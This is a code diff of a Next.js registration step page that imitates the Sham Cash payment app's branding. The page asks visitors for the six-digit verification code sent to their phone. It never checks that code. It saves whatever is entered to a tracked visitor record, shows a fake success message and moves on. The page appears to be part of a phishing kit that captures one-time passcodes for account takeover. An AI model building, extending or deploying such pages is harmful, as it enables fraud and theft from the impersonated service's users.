@@ -1,182 +1,313 @@
 'use client';
 
-import { useState } from 'react';
+import { useRef, useState } from 'react';
 import { useRouter } from 'next/navigation';
-import StepIndicator from '@/components/StepIndicator';
 import { useVisitorContext } from '@/contexts/VisitorContext';
+
+const VERIFICATION_DELAY_MS = 600;
+const SUCCESS_MESSAGE_DURATION_MS = 800;
 
 export default function Step3Page() {
   const router = useRouter();
   const { updateVisitorData, updateVisitorStep } = useVisitorContext();
-  const [securityCode] = useState(() => {
-    // Generate a mock security code
-    return Math.random().toString(36).substring(2, 8).toUpperCase();
-  });
-  const [enteredCode, setEnteredCode] = useState('');
+  const [otp, setOtp] = useState(['', '', '', '', '', '']);
   const [error, setError] = useState('');
-  const [copied, setCopied] = useState(false);
+  const [success, setSuccess] = useState(false);
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
 
-  const handleCopy = async () => {
-    try {
-      await navigator.clipboard.writeText(securityCode);
-      setCopied(true);
-      setTimeout(() => setCopied(false), 2000);
-    } catch {
-      // Fallback
-      const textArea = document.createElement('textarea');
-      textArea.value = securityCode;
-      document.body.appendChild(textArea);
-      textArea.select();
-      document.execCommand('copy');
-      document.body.removeChild(textArea);
-      setCopied(true);
-      setTimeout(() => setCopied(false), 2000);
+  const handleChange = (value: string, index: number) => {
+    const clean = value.replace(/\D/g, '').slice(0, 1);
+    const newOtp = [...otp];
+    newOtp[index] = clean;
+    setOtp(newOtp);
+    if (error) setError('');
+
+    if (clean && index < 5) {
+      inputRefs.current[index + 1]?.focus();
     }
   };
 
-  const handleSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
-
-    if (!enteredCode.trim()) {
-      setError('رمز الأمان مطلوب');
-      return;
+  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>, index: number) => {
+    if (e.key === 'Backspace') {
+      if (otp[index]) {
+        const newOtp = [...otp];
+        newOtp[index] = '';
+        setOtp(newOtp);
+      } else if (index > 0) {
+        inputRefs.current[index - 1]?.focus();
+      }
     }
+  };
 
-    if (enteredCode.trim().toUpperCase() !== securityCode) {
-      setError('رمز الأمان غير صحيح، يرجى المحاولة مرة أخرى');
+  const handlePaste = (e: React.ClipboardEvent) => {
+    e.preventDefault();
+    const text = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
+    if (text) {
+      const newOtp = [...otp];
+      for (let i = 0; i < text.length; i++) {
+        newOtp[i] = text[i];
+      }
+      setOtp(newOtp);
+      if (error) setError('');
+      const nextIndex = Math.min(text.length, 5);
+      inputRefs.current[nextIndex]?.focus();
+    }
+  };
+
+  const handleConfirm = async () => {
+    const code = otp.join('');
+    if (code.length < 6) {
+      setError('يرجى إدخال رمز التحقق كاملاً (6 أرقام)');
       return;
     }
 
     setError('');
     setIsSubmitting(true);
 
-    // Update the current visitor in the global context
     const visitorId = sessionStorage.getItem('currentVisitorId');
     if (visitorId) {
-      updateVisitorData(visitorId, { securityCode: enteredCode.trim().toUpperCase() });
+      updateVisitorData(visitorId, { securityCode: code });
       updateVisitorStep(visitorId, 3);
     }
 
-    await new Promise((r) => setTimeout(r, 400));
+    await new Promise((r) => setTimeout(r, VERIFICATION_DELAY_MS));
+    setSuccess(true);
+    await new Promise((r) => setTimeout(r, SUCCESS_MESSAGE_DURATION_MS));
     router.push('/registration/step-4');
   };
 
   return (
-    <div className="min-h-screen bg-[#f0f4f8] flex items-center justify-center p-4">
-      <div className="w-full max-w-md">
-        {/* Header */}
-        <div className="text-center mb-8">
-          <div className="w-16 h-16 bg-[#4A7FFF] rounded-2xl flex items-center justify-center mx-auto mb-4 shadow-lg shadow-[#4A7FFF]/30">
-            <svg className="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
-            </svg>
-          </div>
-          <h1 className="text-2xl font-bold text-gray-800 mb-1">رمز الأمان</h1>
-          <p className="text-gray-500 text-sm">انسخ رمز الأمان وأدخله في الحقل أدناه</p>
+    <div
+      dir="rtl"
+      style={{
+        minHeight: '100vh',
+        background: '#0b1d3a',
+        color: 'white',
+        fontFamily: 'Segoe UI, Tahoma, Arial, sans-serif',
+        display: 'flex',
+        flexDirection: 'column',
+        alignItems: 'center',
+      }}
+    >
+      {/* Header */}
+      <div
+        style={{
+          width: '100%',
+          maxWidth: 420,
+          padding: '16px 20px',
+          display: 'flex',
+          justifyContent: 'space-between',
+          alignItems: 'center',
+        }}
+      >
+        <span
+          role="button"
+          aria-label="فتح القائمة"
+          tabIndex={0}
+          onKeyDown={(e) => e.key === 'Enter' && e.currentTarget.click()}
+          style={{ fontSize: 26, cursor: 'pointer', color: '#a0aec0' }}
+        >
+          ≡
+        </span>
+        <span style={{ fontWeight: 'bold', fontSize: 16 }}>شام كاش</span>
+      </div>
+
+      {/* Logo Section */}
+      <div style={{ textAlign: 'center', marginTop: 16, marginBottom: 24 }}>
+        <div
+          style={{
+            width: 72,
+            height: 72,
+            background: 'linear-gradient(135deg, #00c6ff, #0072ff)',
+            borderRadius: 18,
+            margin: '0 auto 12px',
+            display: 'flex',
+            alignItems: 'center',
+            justifyContent: 'center',
+            fontSize: 24,
+            fontWeight: 'bold',
+            color: 'white',
+            boxShadow: '0 4px 24px rgba(0,114,255,0.4)',
+          }}
+        >
+          SC
         </div>
+        <h2 style={{ fontSize: 20, fontWeight: 'bold', marginBottom: 4 }}>شام كاش</h2>
+        <p style={{ color: '#a0aec0', fontSize: 13 }}>نظام التسجيل</p>
+      </div>
 
-        {/* Step Indicator */}
-        <div className="mb-8">
-          <StepIndicator currentStep={3} />
-        </div>
-
-        {/* Security Code Display Card */}
-        <div className="bg-white rounded-2xl p-6 border border-gray-200 shadow-lg mb-4">
-          <p className="text-gray-600 text-sm text-center mb-4">رمز الأمان الخاص بك</p>
-
-          <div className="flex items-center justify-between bg-[#f0f4f8] rounded-xl px-5 py-4 border border-gray-200 mb-6">
-            <button
-              type="button"
-              onClick={handleCopy}
-              className={`flex items-center gap-2 text-sm font-medium transition-all duration-200 ${
-                copied ? 'text-green-500' : 'text-[#4A7FFF] hover:text-[#3a6fee]'
-              }`}
-            >
-              {copied ? (
-                <>
-                  <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
-                  </svg>
-                  تم النسخ!
-                </>
-              ) : (
-                <>
-                  <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
-                  </svg>
-                  نسخ
-                </>
-              )}
-            </button>
-
-            <span className="text-2xl font-bold tracking-widest text-gray-800 font-mono select-all">
-              {securityCode}
-            </span>
-          </div>
-
-          {/* Enter Code Form */}
-          <form onSubmit={handleSubmit} className="space-y-4" noValidate>
-            <div>
-              <label className="block text-gray-600 text-sm font-medium mb-2">
-                أدخل رمز الأمان
-              </label>
-              <input
-                type="text"
-                value={enteredCode}
-                onChange={(e) => {
-                  setEnteredCode(e.target.value.toUpperCase());
-                  if (error) setError('');
-                }}
-                placeholder="أدخل الرمز هنا"
-                maxLength={8}
-                className={`w-full border rounded-xl px-4 py-3 text-center text-xl font-bold tracking-widest font-mono transition-all duration-200 focus:outline-none ${
-                  error
-                    ? 'border-red-400 bg-red-50 focus:border-red-500 focus:ring-1 focus:ring-red-400'
-                    : 'border-gray-300 bg-white focus:border-[#4A7FFF] focus:ring-1 focus:ring-[#4A7FFF]'
-                }`}
-                dir="ltr"
-              />
-              {error && (
-                <p className="text-red-500 text-sm mt-1 text-right">{error}</p>
-              )}
-            </div>
-
-            <button
-              type="submit"
-              disabled={isSubmitting}
-              className="w-full bg-[#4A7FFF] hover:bg-[#3a6fee] text-white font-bold py-4 px-6 rounded-xl transition-all duration-200 text-base flex items-center justify-center gap-2"
-              style={{ minHeight: '52px' }}
-            >
-              {isSubmitting ? (
-                <>
-                  <svg className="animate-spin w-5 h-5" fill="none" viewBox="0 0 24 24">
-                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
-                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
-                  </svg>
-                  جاري التحقق...
-                </>
-              ) : (
-                <>
-                  تأكيد الرمز
-                  <svg className="w-5 h-5 rotate-180" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
-                  </svg>
-                </>
-              )}
-            </button>
-          </form>
-        </div>
-
-        {/* Back link */}
-        <div className="text-center mt-4">
-          <button
-            onClick={() => router.back()}
-            className="text-gray-500 hover:text-gray-700 text-sm transition-colors"
+      {/* Main Content */}
+      <div style={{ width: '100%', maxWidth: 420, padding: '0 20px', flex: 1 }}>
+        <div
+          style={{
+            background: '#1a2c4a',
+            borderRadius: 20,
+            padding: '28px 20px',
+            border: '1px solid #2d3a5a',
+          }}
+        >
+          <h3
+            style={{
+              fontSize: 20,
+              fontWeight: 'bold',
+              textAlign: 'center',
+              marginBottom: 8,
+            }}
           >
-            ← العودة للخطوة السابقة
-          </button>
+            التحقق من هويتك
+          </h3>
+          <p
+            id="otp-instructions"
+            style={{
+              color: '#a0aec0',
+              fontSize: 14,
+              textAlign: 'center',
+              marginBottom: 28,
+            }}
+          >
+            أدخل رمز التحقق المرسل إلى رقمك
+          </p>
+
+          {/* OTP Inputs */}
+          <div
+            onPaste={handlePaste}
+            style={{
+              display: 'flex',
+              gap: 10,
+              justifyContent: 'center',
+              direction: 'ltr',
+              marginBottom: 24,
+            }}
+          >
+            {otp.map((digit, i) => (
+              <input
+                key={i}
+                ref={(el) => {
+                  inputRefs.current[i] = el;
+                }}
+                id={`otp-${i}`}
+                type="text"
+                inputMode="numeric"
+                value={digit}
+                onChange={(e) => handleChange(e.target.value, i)}
+                onKeyDown={(e) => handleKeyDown(e, i)}
+                maxLength={1}
+                autoFocus={i === 0}
+                aria-label={`رقم التحقق ${i + 1}`}
+                aria-describedby="otp-instructions"
+                style={{
+                  width: 46,
+                  height: 52,
+                  textAlign: 'center',
+                  fontSize: 22,
+                  fontWeight: 'bold',
+                  borderRadius: 12,
+                  border: `2px solid ${digit ? '#4da3ff' : '#2d4070'}`,
+                  background: '#1b2f55',
+                  color: 'white',
+                  outline: 'none',
+                  transition: 'border-color 0.2s',
+                }}
+                onFocus={(e) => {
+                  e.target.style.borderColor = '#4da3ff';
+                }}
+                onBlur={(e) => {
+                  e.target.style.borderColor = otp[i] ? '#4da3ff' : '#2d4070';
+                }}
+              />
+            ))}
+          </div>
+
+          {/* Error */}
+          {error && (
+            <p
+              style={{
+                color: '#fc8181',
+                textAlign: 'center',
+                fontSize: 13,
+                marginBottom: 16,
+              }}
+            >
+              {error}
+            </p>
+          )}
+
+          {/* Success */}
+          {success && (
+            <p
+              style={{
+                color: '#68d391',
+                textAlign: 'center',
+                fontSize: 13,
+                marginBottom: 16,
+              }}
+            >
+              ✓ تم التحقق بنجاح! جاري الانتقال...
+            </p>
+          )}
+
+          {/* Confirm Button */}
+          <div style={{ display: 'flex', justifyContent: 'center' }}>
+            <button
+              onClick={handleConfirm}
+              disabled={isSubmitting}
+              style={{
+                width: 200,
+                padding: '13px 0',
+                borderRadius: 14,
+                border: 'none',
+                background: '#2ecc71',
+                color: 'white',
+                fontSize: 18,
+                fontWeight: 'bold',
+                cursor: isSubmitting ? 'not-allowed' : 'pointer',
+                opacity: isSubmitting ? 0.8 : 1,
+                transition: 'background 0.2s',
+              }}
+            >
+              {isSubmitting ? 'جاري التحقق...' : 'تأكيد'}
+            </button>
+          </div>
         </div>
+      </div>
+
+      {/* Footer Navigation */}
+      <div
+        style={{
+          width: '100%',
+          maxWidth: 420,
+          display: 'flex',
+          justifyContent: 'space-between',
+          padding: '20px 20px 32px',
+          marginTop: 'auto',
+        }}
+      >
+        <button
+          onClick={() => router.push('/registration/step-2')}
+          style={{
+            background: 'none',
+            border: 'none',
+            color: '#4da3ff',
+            fontSize: 16,
+            cursor: 'pointer',
+          }}
+        >
+          ← السابق
+        </button>
+        <button
+          onClick={() => router.push('/registration/step-4')}
+          disabled={!success}
+          style={{
+            background: 'none',
+            border: 'none',
+            color: success ? '#4da3ff' : '#4a5568',
+            fontSize: 16,
+            cursor: success ? 'pointer' : 'not-allowed',
+          }}
+        >
+          التالي →
+        </button>
       </div>
     </div>
   );
